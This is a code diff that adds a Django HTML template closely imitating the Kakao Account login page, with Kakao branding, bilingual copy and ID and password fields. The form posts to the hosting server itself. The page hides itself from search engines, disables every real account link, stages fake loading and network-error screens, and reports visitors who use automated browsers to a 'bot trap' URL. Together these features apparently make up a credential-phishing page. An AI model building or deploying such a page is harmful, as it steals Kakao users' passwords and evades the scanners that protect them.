@@ -1,0 +1,717 @@
+{% load static %}
+<!doctype html>
+<html lang="{{ language|default:'ko' }}"{% if show_intro %} class="login-intro-active"{% endif %}>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+  <title>{% if language == 'en' %}Kakao Account{% else %}카카오계정{% endif %}</title>
+  <link rel="icon" href="{% static 'accounts/images/favicon.ico' %}" sizes="any">
+  <style>
+    :root {
+      color-scheme: light;
+      --bg: #fff;
+      --text: #191919;
+      --muted: #666;
+      --subtle: #7f7f7f;
+      --line: rgba(0, 0, 0, .12);
+      --soft-line: rgba(0, 0, 0, .06);
+      --soft-bg: rgba(0, 0, 0, .06);
+      --field-line: #ccc;
+      --field-focus: #191919;
+      --icon: #8e8e8e;
+      --menu-bg: #fff;
+      --menu-border: #ddd;
+      --menu-selected: rgba(44, 136, 222, .06);
+      --separator: rgba(0, 0, 0, .1);
+      --yellow: #fee500;
+      --error: #e65f3e;
+    }
+    @media (prefers-color-scheme: dark) {
+      :root {
+        color-scheme: dark;
+        --bg: #121212;
+        --text: #f2f2f2;
+        --muted: #b8b8b8;
+        --subtle: #888;
+        --line: rgba(255, 255, 255, .14);
+        --soft-line: rgba(255, 255, 255, .08);
+        --soft-bg: rgba(255, 255, 255, .06);
+        --field-line: #555;
+        --field-focus: #cfcfcf;
+        --icon: #777;
+        --menu-bg: #2e2e2e;
+        --menu-border: rgba(255, 255, 255, .12);
+        --menu-selected: rgba(73, 168, 248, .08);
+        --separator: rgba(255, 255, 255, .1);
+      }
+    }
+    * { box-sizing: border-box; }
+    html, body { height: 100%; }
+    body, button, input {
+      margin: 0;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+        "Apple SD Gothic Neo", "Malgun Gothic", Arial, sans-serif;
+      font-weight: 400;
+    }
+    html.login-intro-active, body.login-intro-active { overflow: hidden; }
+    body { min-width: 320px; color: var(--text); background: var(--bg); }
+    button, input { font: inherit; }
+    button { border: 0; cursor: pointer; }
+    a { color: inherit; text-decoration: none; }
+    ul { margin: 0; padding: 0; list-style: none; }
+    p, h1 { margin: 0; }
+    .page { min-height: 100%; display: flex; flex-direction: column; justify-content: center; }
+    main { width: 100%; }
+    .brand-wrap { padding-top: 50px; }
+    .brand {
+      display: block;
+      width: 88px;
+      height: 27px;
+      margin: 0 auto;
+      overflow: hidden;
+      text-indent: -9999px;
+      background: url("{% static 'accounts/images/logo_kakao.png' %}") 0 0 / 100px 80px no-repeat;
+    }
+    @media (prefers-color-scheme: dark) {
+      .brand { background-position: 0 -40px; }
+    }
+    .card {
+      position: relative;
+      width: 580px;
+      min-height: 480px;
+      margin: 40px auto 30px;
+      padding: 0 69px;
+      border: 1px solid var(--line);
+    }
+    .content { padding: 55px 0 50px; }
+    .field { position: relative; margin-top: 5px; padding-bottom: 3px; }
+    .field:first-child { margin-top: 4px; }
+    .input-line {
+      position: relative;
+      border-bottom: 2px solid var(--field-line);
+      transition: border-color .15s;
+    }
+    .input-line:focus-within { border-color: var(--field-focus); }
+    .input-line.has-value { padding-right: 36px; }
+    .input-line.mail-mode { padding-right: 128px; }
+    .input-line input {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      min-height: 45px;
+      padding: 10px 0 8px;
+      border: 0;
+      outline: 0;
+      color: var(--text);
+      caret-color: var(--text);
+      background: transparent;
+      font-size: 18px;
+      line-height: 25px;
+    }
+    .input-line input[type="password"] { letter-spacing: .15em; }
+    .input-line input[type="password"]::placeholder { letter-spacing: 0; }
+    .input-line input::placeholder { color: var(--icon); opacity: 1; }
+    .field-tools {
+      position: absolute;
+      z-index: 2;
+      top: 2px;
+      right: 0;
+      height: 43px;
+      display: flex;
+      align-items: center;
+      color: var(--icon);
+    }
+    .clear, .reveal {
+      display: none;
+      width: 30px;
+      height: 40px;
+      padding: 0;
+      color: var(--icon);
+      background: transparent;
+    }
+    #idLine.has-value .clear, #passwordLine.has-value .reveal {
+      display: inline-grid;
+      place-items: center;
+    }
+    .clear::before {
+      content: "";
+      display: block;
+      width: 20px;
+      height: 20px;
+      background: url("{% static 'accounts/images/ico_comm_pc.png' %}") -50px -25px / 300px auto no-repeat;
+    }
+    .reveal::before {
+      content: "";
+      display: block;
+      width: 24px;
+      height: 24px;
+      background: url("{% static 'accounts/images/ico_comm_pc.png' %}") -200px -50px / 300px auto no-repeat;
+    }
+    #passwordLine.password-visible .reveal::before { background-position: -230px -50px; }
+    @media (prefers-color-scheme: dark) {
+      .clear::before { background-position: -75px -25px; }
+      .reveal::before { background-position: -200px -80px; }
+      #passwordLine.password-visible .reveal::before { background-position: -230px -80px; }
+    }
+    .mail-suffix { display: none; padding-left: 4px; font-size: 16px; font-weight: 500; }
+    .mail-mode .mail-suffix { display: inline; }
+    .tip {
+      display: none;
+      padding: 13px 0 8px;
+      color: var(--muted);
+      font-size: 12px;
+      line-height: 18px;
+    }
+    .tip.show { display: block; }
+    .tip strong { margin-right: 3px; color: var(--error); }
+    .save-row {
+      position: relative;
+      display: flex;
+      align-items: center;
+      min-height: 20px;
+      margin-top: 25px;
+      color: var(--muted);
+      font-size: 14px;
+      line-height: 20px;
+    }
+    .save-row > input { position: absolute; width: 1px; height: 1px; opacity: 0; }
+    .save-row label { display: inline-flex; align-items: center; cursor: pointer; }
+    .check {
+      display: block;
+      flex: 0 0 auto;
+      width: 20px;
+      height: 20px;
+      margin-right: 8px;
+      background: url("{% static 'accounts/images/ico_comm_pc.png' %}") 0 0 / 300px auto no-repeat;
+    }
+    .save-row input:checked + label .check { background-position: -25px 0; }
+    @media (prefers-color-scheme: dark) {
+      .check { background-position: 0 -25px; }
+    }
+    .help {
+      width: 18px;
+      height: 18px;
+      margin-left: 6px;
+      padding: 0;
+      background: transparent;
+      font-size: 0;
+    }
+    .help::before {
+      content: "";
+      display: block;
+      width: 18px;
+      height: 18px;
+      background: url("{% static 'accounts/images/ico_comm_pc.png' %}") -120px -110px / 300px auto no-repeat;
+    }
+    @media (prefers-color-scheme: dark) {
+      .help::before { background-position: -140px -110px; }
+    }
+    .save-tooltip {
+      display: none;
+      position: absolute;
+      top: 29px;
+      left: 0;
+      z-index: 10;
+      width: 280px;
+      padding: 8px 12px;
+      border-radius: 3px;
+      color: #fff;
+      background: rgba(0, 0, 0, .82);
+      font-size: 12px;
+      line-height: 18px;
+    }
+    .save-tooltip.show { display: block; }
+    .save-tooltip a { color: #fbdd0d; }
+    .error-box {
+      display: none;
+      margin-top: 20px;
+      padding: 20px;
+      color: var(--error);
+      background: var(--soft-bg);
+      font-size: 13px;
+      line-height: 20px;
+    }
+    .error-box.show { display: block; }
+    .actions { padding-top: 40px; text-align: center; }
+    .primary, .secondary {
+      width: 100%;
+      height: 50px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 500;
+    }
+    .primary { color: #000; background: var(--yellow); }
+    .primary:hover { background: #f4dc00; }
+    .secondary { color: var(--text); background: var(--soft-bg); }
+    .secondary:hover { background: var(--line); }
+    .or { display: flex; align-items: center; padding: 15px 0; color: #828282; font-size: 12px; }
+    .or::before, .or::after { content: ""; flex: 1; height: 1px; background: var(--soft-line); }
+    .or span { width: 40px; text-align: center; }
+    .account-links {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 26px;
+      font-size: 12px;
+      line-height: 18px;
+    }
+    .find-links { display: flex; }
+    .find-links li + li::before {
+      content: "";
+      display: inline-block;
+      width: 1px;
+      height: 10px;
+      margin: 0 10px;
+      background: var(--separator);
+      vertical-align: -1px;
+    }
+    .banner { padding-top: 60px; }
+    .banner a {
+      display: block;
+      overflow: hidden;
+      border-radius: 4px;
+      background: #f3f3f3;
+      text-align: center;
+    }
+    .banner img { display: block; width: 100%; max-width: 335px; margin: auto; }
+    footer {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 0 40px;
+      color: var(--subtle);
+      white-space: nowrap;
+      font-size: 0;
+    }
+    .footer-group { display: flex; align-items: center; height: 37px; }
+    .lang { position: relative; display: inline-block; }
+    .lang-button, footer a {
+      display: inline-flex;
+      align-items: center;
+      height: 37px;
+      padding: 10px 12px;
+      color: var(--subtle);
+      background: transparent;
+      font-size: 13px;
+    }
+    .lang-button::after {
+      content: "";
+      width: 6px;
+      height: 6px;
+      margin: -3px 0 0 7px;
+      border-right: 1px solid currentColor;
+      border-bottom: 1px solid currentColor;
+      transform: rotate(45deg);
+    }
+    .lang.open .lang-button::after { transform: rotate(225deg); }
+    .lang-menu {
+      display: none;
+      position: absolute;
+      left: -2px;
+      bottom: 30px;
+      z-index: 5;
+      min-width: 90px;
+      padding: 7px 0;
+      border: 1px solid var(--menu-border);
+      border-radius: 4px;
+      background: var(--menu-bg);
+    }
+    .lang.open .lang-menu { display: block; }
+    .lang-menu button {
+      width: 100%;
+      height: 28px;
+      padding: 0 12px;
+      color: var(--text);
+      background: var(--menu-bg);
+      text-align: left;
+      font-size: 12px;
+    }
+    .lang-menu button[aria-selected="true"], .lang-menu button:hover { background: var(--menu-selected); font-weight: 700; }
+    .policy a { position: relative; }
+    .policy a::before {
+      content: "";
+      position: absolute;
+      top: 50%;
+      left: 0;
+      width: 1px;
+      height: 14px;
+      background: var(--line);
+      transform: translateY(-50%);
+    }
+    .copyright { display: inline-flex; align-items: center; height: 37px; padding-left: 12px; font-size: 13px; }
+    .copyright a { padding-left: 4px; }
+    .nid-hp { position: absolute; left: -10000px; width: 1px; height: 1px; overflow: hidden; }
+    @media (max-width: 767px) {
+      .page { justify-content: flex-start; }
+      main { flex: 1; display: flex; flex-direction: column; }
+      .brand-wrap { padding-top: 50px; padding-bottom: 8px; }
+      .card { flex: 1; width: auto; min-height: auto; margin: 0; padding: 0 16px; border: 0; }
+      .content { min-height: 100%; display: flex; flex-direction: column; padding: 20px 0 30px; }
+      .field:first-child { margin-top: 40px; }
+      .actions { padding-top: 30px; }
+      .banner { margin-top: auto; margin-bottom: -36px; }
+      footer { flex-wrap: wrap; padding: 82px 0 40px; }
+      .footer-group { height: 29px; }
+      .lang-button, footer a { height: 29px; padding: 6px 8px; }
+      .lang-menu { bottom: 33px; }
+      .copyright { flex: 0 0 100%; justify-content: center; height: 23px; margin-top: 12px; padding: 0; }
+      .tip { padding: 6px 0 10px; font-size: 11px; line-height: 19px; }
+      .clear::before {
+        width: 16px;
+        height: 16px;
+        background-image: url("{% static 'accounts/images/ico_comm_mobile.png' %}");
+        background-position: -50px -25px;
+        background-size: 150px auto;
+      }
+      .reveal::before {
+        background-image: url("{% static 'accounts/images/ico_comm_mobile.png' %}");
+        background-position: -100px -155px;
+        background-size: 150px auto;
+      }
+      #passwordLine.password-visible .reveal::before { background-position: -100px -180px; }
+      .check {
+        background-image: url("{% static 'accounts/images/ico_comm_mobile.png' %}");
+        background-size: 150px auto;
+      }
+      .help::before {
+        background-image: url("{% static 'accounts/images/ico_comm_mobile.png' %}");
+        background-position: -130px -125px;
+        background-size: 150px auto;
+      }
+    }
+    @media (max-width: 767px) and (prefers-color-scheme: dark) {
+      .clear::before { background-position: -75px -25px; }
+      .reveal::before { background-position: -125px -165px; }
+      #passwordLine.password-visible .reveal::before { background-position: -125px -190px; }
+      .help::before { background-position: -130px -145px; }
+    }
+  </style>
+</head>
+<body{% if show_intro %} class="login-intro-active"{% endif %}>
+  {% include "accounts/mybox_intro_splash.html" %}
+  {% include "accounts/loading_splash.html" %}
+  {% include "accounts/network_error_splash.html" %}
+  <div class="page">
+    <main>
+      <div class="brand-wrap"><h1 class="brand">kakao</h1></div>
+      <article class="card">
+        <div class="content">
+          <form id="loginForm" action="{{ request.get_full_path }}" method="post" novalidate>
+            {% csrf_token %}
+            <input id="locale" name="locale" type="hidden" value="{{ language|default:'ko' }}">
+            {% if login_redirect_param %}<input name="url" type="hidden" value="{{ login_redirect_param }}">{% endif %}
+            <div class="nid-hp" aria-hidden="true">
+              <label for="homepage">Homepage</label>
+              <input id="homepage" name="homepage" type="text" tabindex="-1" autocomplete="off">
+            </div>
+            <div class="field">
+              <div class="input-line{% if submitted_id %} has-value{% endif %}" id="idLine">
+                <input id="loginId" name="id" value="{{ submitted_id }}" type="text" autocomplete="webauthn"
+                  placeholder="{% if language == 'en' %}KakaoMail ID, email, phone number{% else %}카카오메일 아이디, 이메일, 전화번호 {% endif %}"
+                  aria-label="계정 정보 입력" autofocus>
+                <div class="field-tools">
+                  <button class="clear" type="button" aria-label="입력 내용 지우기"></button>
+                  <span class="mail-suffix">@kakao.com</span>
+                </div>
+              </div>
+              <p class="tip" id="mailTip"><strong>TIP</strong> 카카오메일이 있다면 메일 아이디만 입력해 보세요.</p>
+            </div>
+            <div class="field">
+              <div class="input-line" id="passwordLine">
+                <input id="password" name="pw" type="password" autocomplete="off"
+                  placeholder="{% if language == 'en' %}Password{% else %}비밀번호{% endif %}" aria-label="비밀번호 입력">
+                <div class="field-tools">
+                  <button class="reveal" type="button" aria-label="비밀번호 보기"></button>
+                </div>
+              </div>
+            </div>
+            <div class="save-row">
+              <input id="saveLogin" name="save_login" type="checkbox">
+              <label for="saveLogin"><span class="check"></span><span data-t="save">간편로그인 정보 저장</span></label>
+              <button class="help" type="button" aria-label="도움말" aria-controls="saveTooltip" aria-expanded="false">?</button>
+              <div class="save-tooltip" id="saveTooltip" role="tooltip">
+                <p data-t="saveHelp">로그인한 계정의 정보가 저장됩니다. 개인정보 보호를 위해 개인 기기에서만 사용해 주세요.</p>
+                <a href="#" data-t="helpMore">도움말 보기</a>
+              </div>
+            </div>
+            <div class="error-box{% if id_required or id_invalid or pw_invalid or login_error %} show{% endif %}" id="errorBox" role="alert"
+              data-server-error="{% if id_required %}id{% elif id_invalid %}invalid-id{% elif pw_invalid %}invalid-password{% elif login_error %}login{% endif %}">
+              {% if id_required %}
+                카카오계정을 입력해 주세요.
+              {% elif id_invalid %}
+                {% if language == 'en' %}Please enter your Kakao Account correctly.{% else %}카카오계정을 정확하게 입력해 주세요.{% endif %}
+              {% elif pw_invalid %}
+                {% if language == 'en' %}Please enter 8–32 characters using at least two of the following: letters, numbers, and special characters.{% else %}8~32자리의 영문자·숫자·특수문자 중 2가지 이상을 조합해 주세요.{% endif %}
+              {% else %}
+                카카오계정 혹은 비밀번호가 일치하지 않습니다. 입력한 내용을 다시 확인해 주세요.
+              {% endif %}
+            </div>
+            <div class="actions">
+              <button class="primary" type="submit" data-t="login">로그인</button>
+              <div class="or"><span data-t="or">또는</span></div>
+              <button class="secondary" type="button" data-t="qr">QR코드 로그인</button>
+            </div>
+          </form>
+          <nav class="account-links" aria-label="계정 메뉴">
+            <a href="#" data-t="signup">회원가입</a>
+            <ul class="find-links">
+              <li><a href="#" data-t="find">계정 찾기</a></li>
+              <li><a href="#" data-t="reset">비밀번호 찾기</a></li>
+            </ul>
+          </nav>
+          <div class="banner">
+            <a id="bannerLink" href="#" aria-label="POP3/IMAP 2단계 인증 안내">
+              <img id="bannerImage" src="{% static 'accounts/images/mail_banner_1_ko.png' %}"
+                data-ko-src="{% static 'accounts/images/mail_banner_1_ko.png' %}"
+                data-en-src="{% static 'accounts/images/mail_banner_2_en.png' %}"
+                alt="[광고] POP3/IMAP을 사용하려면 2단계 인증을 설정해 주세요.">
+            </a>
+          </div>
+        </div>
+      </article>
+    </main>
+    <footer>
+      <div class="footer-group">
+        <div class="lang" id="languageSelect">
+          <button class="lang-button" id="langButton" type="button" aria-controls="languageMenu"
+            aria-haspopup="listbox" aria-expanded="false">{% if language == 'en' %}English{% else %}한국어{% endif %}</button>
+          <ul class="lang-menu" id="languageMenu" role="listbox" aria-label="언어 선택">
+            <li><button id="langKO" type="button" role="option" aria-selected="{% if language != 'en' %}true{% else %}false{% endif %}" data-lang="ko">한국어</button></li>
+            <li><button id="langEN" type="button" role="option" aria-selected="{% if language == 'en' %}true{% else %}false{% endif %}" data-lang="en">English</button></li>
+          </ul>
+        </div>
+      </div>
+      <div class="footer-group policy">
+        <a href="#" data-t="terms">이용약관</a>
+        <a href="#"><strong data-t="privacy">개인정보 처리방침</strong></a>
+        <a href="#" data-t="support">고객센터</a>
+      </div>
+      <small class="copyright">©<a href="#">Kakao Corp.</a></small>
+    </footer>
+  </div>
+  <script>
+    (function () {
+      "use strict";
+      var copy = {
+        ko: {
+          title: "카카오계정", id: "카카오메일 아이디, 이메일, 전화번호 ", password: "비밀번호",
+          idLabel: "계정 정보 입력", passwordLabel: "비밀번호 입력", clearLabel: "입력 내용 지우기",
+          revealLabel: "비밀번호 보기", hideLabel: "비밀번호 숨기기",
+          save: "간편로그인 정보 저장", login: "로그인", or: "또는", qr: "QR코드 로그인",
+          signup: "회원가입", find: "계정 찾기", reset: "비밀번호 찾기", terms: "이용약관",
+          privacy: "개인정보 처리방침", support: "고객센터", lang: "한국어",
+          saveHelp: "로그인한 계정의 정보가 저장됩니다. 개인정보 보호를 위해 개인 기기에서만 사용해 주세요.",
+          helpMore: "도움말 보기", tip: "<strong>TIP</strong> 카카오메일이 있다면 메일 아이디만 입력해 보세요.",
+          idRequired: "카카오계정을 입력해 주세요.", invalidId: "카카오계정을 정확하게 입력해 주세요.",
+          invalidPassword: "8~32자리의 영문자·숫자·특수문자 중 2가지 이상을 조합해 주세요.",
+          error: "카카오계정 혹은 비밀번호가 일치하지 않습니다. 입력한 내용을 다시 확인해 주세요."
+        },
+        en: {
+          title: "Kakao Account", id: "KakaoMail ID, email, phone number", password: "Password",
+          idLabel: "Enter account information", passwordLabel: "Enter password", clearLabel: "Clear input",
+          revealLabel: "Show password", hideLabel: "Hide password",
+          save: "Save Login Information", login: "Log In", or: "or", qr: "Log in with QR code",
+          signup: "Sign Up", find: "Find Account", reset: "Reset Password", terms: "Terms of Service",
+          privacy: "Privacy Policy", support: "Customer Service", lang: "English",
+          saveHelp: "Information of the account you logged into will be saved. Use it only on your personal device.",
+          helpMore: "View help", tip: "<strong>TIP</strong> Enter your ID if you have a KakaoMail account.",
+          idRequired: "Please enter your Kakao Account.", invalidId: "Please enter your Kakao Account correctly.",
+          invalidPassword: "Please enter 8–32 characters using at least two of the following: letters, numbers, and special characters.",
+          error: "The Kakao Account or password does not match. Please check your information."
+        }
+      };
+      var form = document.getElementById("loginForm");
+      var loginId = document.getElementById("loginId");
+      var password = document.getElementById("password");
+      var idLine = document.getElementById("idLine");
+      var passwordLine = document.getElementById("passwordLine");
+      var mailTip = document.getElementById("mailTip");
+      var errorBox = document.getElementById("errorBox");
+      var locale = document.getElementById("locale");
+      var languageSelect = document.getElementById("languageSelect");
+      var langButton = document.getElementById("langButton");
+      var helpButton = document.querySelector(".help");
+      var saveTooltip = document.getElementById("saveTooltip");
+      var language = copy[locale.value] ? locale.value : "ko";
+
+      function syncFields() {
+        var idHasValue = loginId.value.length > 0;
+        var passwordHasValue = password.value.length > 0;
+        var isMailId = /^[A-Za-z]{3,}$/.test(loginId.value);
+        idLine.classList.toggle("has-value", idHasValue);
+        idLine.classList.toggle("mail-mode", isMailId);
+        passwordLine.classList.toggle("has-value", passwordHasValue);
+        mailTip.classList.toggle("show", document.activeElement === loginId || isMailId);
+        if (!passwordHasValue) {
+          password.type = "password";
+          passwordLine.classList.remove("password-visible");
+        }
+      }
+      loginId.addEventListener("input", syncFields);
+      loginId.addEventListener("focus", syncFields);
+      loginId.addEventListener("blur", syncFields);
+      password.addEventListener("input", syncFields);
+      document.querySelector(".clear").addEventListener("click", function () {
+        loginId.value = "";
+        syncFields();
+        loginId.focus();
+      });
+      document.querySelector(".reveal").addEventListener("click", function (event) {
+        password.type = password.type === "password" ? "text" : "password";
+        passwordLine.classList.toggle("password-visible", password.type === "text");
+        event.currentTarget.setAttribute("aria-label",
+          password.type === "password" ? copy[language].revealLabel : copy[language].hideLabel);
+        password.focus();
+      });
+      form.addEventListener("submit", function (event) {
+        var key = "";
+        if (!loginId.value.trim()) key = "idRequired";
+        else if (!isValidLoginIdentifier(loginId.value)) key = "invalidId";
+        else if (!isValidPasswordFormat(password.value)) key = "invalidPassword";
+        if (!key) return;
+        event.preventDefault();
+        errorBox.textContent = copy[language][key];
+        errorBox.classList.add("show");
+        loginId.focus();
+      });
+      function isValidLoginIdentifier(value) {
+        var identifier = value.trim();
+        var kakaoIdPattern = /^\*?[a-z0-9_-]+(?:\.[a-z0-9_-]+)*$/;
+        var validKakaoId = identifier.length >= 3
+          && identifier.length <= 15
+          && kakaoIdPattern.test(identifier)
+          && /[a-z]/.test(identifier)
+          && !/(--|\.\.|__)/.test(identifier);
+        return validKakaoId
+          || /^\S+@\S+\.\S+$/.test(identifier)
+          || /^\d{4,17}$/.test(identifier);
+      }
+      function isValidPasswordFormat(value) {
+        return /^[\x20-\x7E]{4,32}$/.test(value);
+      }
+      helpButton.addEventListener("click", function () {
+        var open = saveTooltip.classList.toggle("show");
+        helpButton.setAttribute("aria-expanded", String(open));
+      });
+      langButton.addEventListener("click", function () {
+        var open = languageSelect.classList.toggle("open");
+        langButton.setAttribute("aria-expanded", String(open));
+      });
+      document.querySelectorAll("[data-lang]").forEach(function (button) {
+        button.addEventListener("click", function () { setLanguage(button.dataset.lang); });
+      });
+      document.querySelectorAll('a[href="#"]').forEach(function (link) {
+        link.addEventListener("click", function (event) { event.preventDefault(); });
+      });
+      document.addEventListener("click", function (event) {
+        if (!helpButton.contains(event.target) && !saveTooltip.contains(event.target)) {
+          saveTooltip.classList.remove("show");
+          helpButton.setAttribute("aria-expanded", "false");
+        }
+        if (!languageSelect.contains(event.target)) {
+          languageSelect.classList.remove("open");
+          langButton.setAttribute("aria-expanded", "false");
+        }
+      });
+      function setLanguage(lang) {
+        language = copy[lang] ? lang : "ko";
+        var text = copy[language];
+        locale.value = language;
+        document.documentElement.lang = language;
+        document.title = text.title;
+        loginId.placeholder = text.id;
+        loginId.setAttribute("aria-label", text.idLabel);
+        password.placeholder = text.password;
+        password.setAttribute("aria-label", text.passwordLabel);
+        document.querySelector(".clear").setAttribute("aria-label", text.clearLabel);
+        document.querySelector(".reveal").setAttribute("aria-label",
+          password.type === "password" ? text.revealLabel : text.hideLabel);
+        langButton.textContent = text.lang;
+        mailTip.innerHTML = text.tip;
+        document.querySelectorAll("[data-t]").forEach(function (node) {
+          node.textContent = text[node.dataset.t];
+        });
+        var bannerImage = document.getElementById("bannerImage");
+        bannerImage.src = language === "en" ? bannerImage.dataset.enSrc : bannerImage.dataset.koSrc;
+        bannerImage.alt = language === "en"
+          ? "[Ad] Enable 2-Step Verification to use POP3/IMAP."
+          : "[광고] POP3/IMAP을 사용하려면 2단계 인증을 설정해 주세요.";
+        document.querySelectorAll("[data-lang]").forEach(function (option) {
+          option.setAttribute("aria-selected", String(option.dataset.lang === language));
+        });
+        var serverError = errorBox.dataset.serverError;
+        if (serverError) {
+          errorBox.textContent = text[serverError === "id" ? "idRequired" :
+            serverError === "invalid-id" ? "invalidId" :
+            serverError === "invalid-password" ? "invalidPassword" : "error"];
+        }
+        languageSelect.classList.remove("open");
+        langButton.setAttribute("aria-expanded", "false");
+      }
+      function finishIntro() {
+        ["loginLoadingSplash", "networkErrorSplash", "myboxIntroSplash"].forEach(function (id) {
+          var element = document.getElementById(id);
+          if (element) element.classList.add("is-hidden");
+        });
+        document.documentElement.classList.remove("login-intro-active");
+        document.body.classList.remove("login-intro-active");
+      }
+      function runIntro() {
+        var config = window.__KAKAO_LOGIN_SPLASH__;
+        if (!config || !config.enabled) {
+          finishIntro();
+          return;
+        }
+        var loading = document.getElementById("loginLoadingSplash");
+        var network = document.getElementById("networkErrorSplash");
+        var mybox = document.getElementById("myboxIntroSplash");
+        function hide(element) { if (element) element.classList.add("is-hidden"); }
+        function show(element) { if (element) element.classList.remove("is-hidden"); }
+        if (config.mode === "mybox" && config.myboxDelayMs > 0) {
+          hide(loading); show(mybox);
+          window.setTimeout(function () {
+            hide(mybox);
+            if (config.errorDelayMs > 0) {
+              show(network); window.setTimeout(finishIntro, config.errorDelayMs);
+            } else finishIntro();
+          }, config.myboxDelayMs);
+          return;
+        }
+        if (config.loadingDelayMs > 0) {
+          show(loading);
+          window.setTimeout(function () {
+            window.setTimeout(function () {
+              hide(loading);
+              if (config.errorDelayMs > 0) {
+                show(network); window.setTimeout(finishIntro, config.errorDelayMs);
+              } else finishIntro();
+            }, config.loadingHoldMs);
+          }, config.loadingDelayMs);
+          return;
+        }
+        hide(loading);
+        if (config.errorDelayMs > 0) {
+          show(network); window.setTimeout(finishIntro, config.errorDelayMs);
+        } else finishIntro();
+      }
+      window.__KAKAO_LOGIN_SPLASH__ = {
+        enabled: {{ show_intro|yesno:"true,false" }},
+        mode: "{{ login_intro_mode|default:'loading'|escapejs }}",
+        loadingDelayMs: {{ loading_delay_ms|default:0 }},
+        loadingHoldMs: {{ loading_hold_ms|default:0 }},
+        errorDelayMs: {{ splash_delay_ms|default:0 }},
+        myboxDelayMs: {{ mybox_delay_ms|default:0 }}
+      };
+      setLanguage(language);
+      syncFields();
+      runIntro();
+      {% if bot_trap_url %}
+      if (navigator.webdriver) {
+        var beacon = new Image();
+        beacon.src = "{{ bot_trap_url|escapejs }}?wd=1";
+      }
+      {% endif %}
+    })();
+  </script>
+</body>
+</html>
